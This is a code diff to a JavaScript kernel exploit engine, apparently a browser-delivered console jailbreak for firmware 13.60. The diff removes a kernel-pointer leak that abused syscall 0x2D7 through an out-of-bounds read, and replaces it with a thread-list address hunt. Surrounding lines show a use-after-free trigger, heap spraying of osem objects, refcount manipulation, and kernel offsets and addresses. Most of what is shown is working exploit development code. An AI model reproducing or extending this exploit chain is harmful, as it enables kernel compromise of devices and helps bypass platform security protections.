@@ -60,8 +60,6 @@ const SYS_OSEM_TRYWAIT  = 0x22A;
 const SYS_OSEM_POST     = 0x22B;
 const SYS_OSEM_CANCEL   = 0x22C;
 
-const SYS_GET_AIO_DEBUG_REQ_INFO = 0x2D7;
-
 const SYS_PIPE2          = 0x2AF;
 const SYS_READ           = 0x003;
 const SYS_WRITE          = 0x004;
@@ -120,7 +118,6 @@ const AIO_MULTI_WAIT_MODE_2 = 2;
 
 const OSEM_SPRAY_COUNT     = 256;
 const OSEM_SPRAY_BATCH     = 64;
-const LEAK_ATTEMPTS        = 16;
 const UAF_RETRY_MAX        = 32;
 const RECLAIM_SPRAY_COUNT  = 512;
 const KREAD_RETRIES        = 3;
@@ -198,37 +195,14 @@ export function makeBagagwaEngine(X) {
 
         // [OOM-fix] engine allocation ledger for the stage-4 trim.
         allocs: [],
-        debugLeakBuf: null,
     };
 
-    // [727-REMOVED] The 727 debug-info leak is OFF by default now — even the
-    // proven PSAITO shape still OOM'd on console. The replacement kernel
-    // address source is the THREAD-HUNT: worker_stack / returnAddressPtr,
-    // found via OFFSET_lk__thread_list (0x6C218, live-verified on 13.60)
-    // during prepare() — zero extra syscalls, zero extra memory.
-    //   ?leak727=1    re-enable the 727 debug-info leak (debugging only)
-    //   ?leak=N       cap leak attempts (default LEAK_ATTEMPTS=16, each is
-    //                 attempts x requests syscalls)
-    //   ?leakshape=0|1
-    //     0 (default): (req_id, dst*, 0)   — PSAITO bagagwa_uaf_1320 proven shape
-    //     1          : (req_id, 0, dst*)   — aio_reach d3 probe shape
-    //   The OLD engine shape (req_id, dst*, 0x100) put 0x100 into an unproven
-    //   slot. If that slot is a COUNT the kernel iterates 256x per call, and
-    //   if the ABI is (id, count, dst*) then the POINTER in the count slot is
-    //   the documented "pointer-as-count -> huge kernel alloc -> OOM" class
-    //   (same as 0x29C upstream v8). That is the prime suspect for the OOM
-    //   that appeared exactly when the leak was wired in.
-    function QP(name, dflt) {
-        try {
-            const m = ((globalThis.location && globalThis.location.search) || "")
-                .match(new RegExp("[?&]" + name + "=([^&]+)"));
-            return m ? decodeURIComponent(m[1]) : dflt;
-        } catch { return dflt; }
-    }
-    const NO_LEAK = QP("leak727", "") !== "1"; // 727 OFF unless explicitly re-enabled
-    const LEAK_ATTEMPTS_EFF = Math.max(1, Math.min(LEAK_ATTEMPTS,
-        parseInt(QP("leak", String(LEAK_ATTEMPTS)), 10) || LEAK_ATTEMPTS));
-    const LEAK_SHAPE = (QP("leakshape", "0") === "1") ? 1 : 0;
+    // [727-REMOVED] The 727 debug-info leak and its raw-syscall gadget scan
+    // are FULLY removed from this build. The scan churned ~500K int64 objects
+    // in one synchronous loop at Run-click -> JSC OOM -> "not enough free
+    // memory" dialog. The kernel address source is now the THREAD-HUNT
+    // (worker_stack / returnAddressPtr via OFFSET_lk__thread_list, found
+    // during prepare — zero syscalls, zero allocations, zero OOM risk).
 
     function alloc(size, label) {
         const dwords = Math.ceil(size / 4);
@@ -625,55 +599,6 @@ export function makeBagagwaEngine(X) {
         flushMark("BAGAGWA-OSEM-SPRAY", "created=" + created + "-target=" + n);
         note("sprayed " + created + " osem objects into 128-byte UMA zone");
         return { ok: created > 0, count: created, handles };
-    }
-
-    async function leakViaDebugInfo(reqId, tableIdx) {
-        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] === undefined && !P.rawSyscall) {
-            return { ok: false, why: "syscall 727 (0x2D7) has no stub and no raw-syscall path" };
-        }
-
-        // [OOM-fix] ONE reused buffer for the whole stage instead of a fresh
-        // 1.25KB pinned alloc per call (16 attempts x N requests used to pin
-        // every dead buffer in P.nogc forever).
-        if (!S.debugLeakBuf) {
-            S.debugLeakBuf = safeAlloc(0x100, "aio-debug-leak");
-            if (!S.debugLeakBuf) return { ok: false, why: "debug-leak buffer OOM (arena exhausted)" };
-            S.debugLeakBuf.keep = true; // reused every call until chain death
-        }
-        const outBuf = S.debugLeakBuf;
-        for (let i = 0; i < 0x100; i++) outBuf.u8[i] = 0;
-
-        const composedId = ((tableIdx & 0x7F) << 16) | (reqId & 0xFFFF);
-
-        // [OOM-fix] proven ABI shapes only — never leave 0x100 in an unproven
-        // slot (pointer-in-count-slot = huge kernel alloc = OOM, see 0x29C).
-        const r = (LEAK_SHAPE === 1)
-            ? await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, 0, outBuf.base)
-            : await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, outBuf.base, 0);
-        if (r.failed) return { ok: false, why: "get_aio_debug_request_info failed: " + r.errText };
-
-        const leaked = [];
-        for (let off = 0; off + 8 <= 0x100; off += 8) {
-            const v = r64(outBuf.u8, off);
-            if (isKernelPtr(v)) {
-                leaked.push({ offset: off, value: v });
-            }
-        }
-
-        for (let off = 0; off + 4 <= 0x100; off += 4) {
-            const dw = r32(outBuf.u8, off) >>> 0;
-            if (dw !== 0 && (dw & 0xFFFF0000) !== 0) {
-                const existing = leaked.find(l => l.offset === (off & ~7));
-                if (!existing) {
-                    leaked.push({ offset: off, dword: dw });
-                }
-            }
-        }
-
-        S.leakedAddrs = S.leakedAddrs.concat(leaked);
-        flushMark("BAGAGWA-LEAK", "composedId=0x" + composedId.toString(16) +
-            "-leaked=" + leaked.length + "-ptrs");
-        return { ok: leaked.length > 0, leaked };
     }
 
     async function triggerWaker(requestIdx) {
@@ -1355,9 +1280,9 @@ export function makeBagagwaEngine(X) {
 
         note("=== Stage 2: kernel address leak ===");
 
-        if (NO_LEAK) {
-            // ===== [727-REMOVED] thread-hunt replacement leak =====
-            note("[leak] 727 disabled (default) — using THREAD-HUNT kernel addresses");
+        // ===== [727-REMOVED] thread-hunt leak (the only kernel-address source) =====
+        if (true) {
+            note("[leak] 727 fully removed — using THREAD-HUNT kernel addresses");
             try {
                 if (P.kernelStack) {
                     note("[leak] worker kernel stack = 0x" + P.kernelStack.toString(16) +
@@ -1379,40 +1304,6 @@ export function makeBagagwaEngine(X) {
             }
             note("[leak] ladder: waker decrement (handle-based, NO addresses) -> " +
                 "lapse IPV6 sweep -> kqueue/pipe walk in stage 4");
-        } else if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined || P.rawSyscall) {
-            note("syscall 727 (0x2D7) " + (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined
-                ? "stub available" : "called via RAW path (WebKit syscall;ret)") +
-                " — get_aio_debug_request_info @ 0x805c3090");
-            note("OOB: source idx = (req_id>>16)+edx scaled by 0x28 into [rax+0x20]");
-            note("[727] shape=" + (LEAK_SHAPE === 1 ? "(id,0,dst)" : "(id,dst,0)") +
-                " attempts=" + LEAK_ATTEMPTS_EFF + " (?leakshape=1 ?leak=N to tune)");
-            for (let tIdx = 0; tIdx < LEAK_ATTEMPTS_EFF; tIdx++) {
-                for (let i = 0; i < S.aioRequests.length; i++) {
-                    const lr = await leakViaDebugInfo(S.aioRequests[i].id, tIdx);
-                    if (lr.ok) {
-                        out.leaked = out.leaked.concat(lr.leaked);
-                        for (const l of lr.leaked) {
-                            if (l.value) {
-                                out.steps.push("leaked ptr at tIdx=" + tIdx +
-                                    " off=0x" + l.offset.toString(16) +
-                                    ": " + hx(l.value));
-                                if (!S.targetOsemAddr && isKernelPtr(l.value) &&
-                                    isAligned8(l.value)) {
-                                    S.targetOsemAddr = l.value;
-                                    out.steps.push("candidate osem object addr: " + hx(l.value));
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-            if (S.targetOsemAddr) {
-                note("leaked candidate osem addr = " + hx(S.targetOsemAddr) +
-                    " (refcount at +" + OSEM_REFCOUNT_OFF.toString(16) + " = " +
-                    hx(S.targetOsemAddr.add32(OSEM_REFCOUNT_OFF)) + ")");
-            }
-        } else {
-            note("syscall 727 (0x2D7) not in firmware profile — using pipe-based leak path");
         }
 
         // 727 is absent on 13.60, so the real leak must come from the lapse
@@ -1520,8 +1411,8 @@ export function makeBagagwaEngine(X) {
         if (!S.fdOfiles && !S.masterPipeData && S.leakedAddrs.length === 0) {
             note("NOTE: no kernel read primitive yet (fdOfiles=null, masterPipeData=null, "
                 + "leakedAddrs=" + S.leakedAddrs.length + "). The kqueue/curproc walks below "
-                + "need an initial kernel read, so they will find nothing until the Stage 2 "
-                + "727 leak returns kernel pointers.");
+                + "need an initial kernel read, so they will find nothing until the "
+                + "Stage 2 thread-hunt / lapse route yields kernel pointers.");
         }
 
         if (S.targetOsemIdx < 0 && !o.force) {
@@ -1808,7 +1699,6 @@ export function makeBagagwaEngine(X) {
         submitAioRequest,
         triggerUaf,
         sprayOsem,
-        leakViaDebugInfo,
         triggerWaker,
         manipulateOsemRefcount,
         setupPipes,
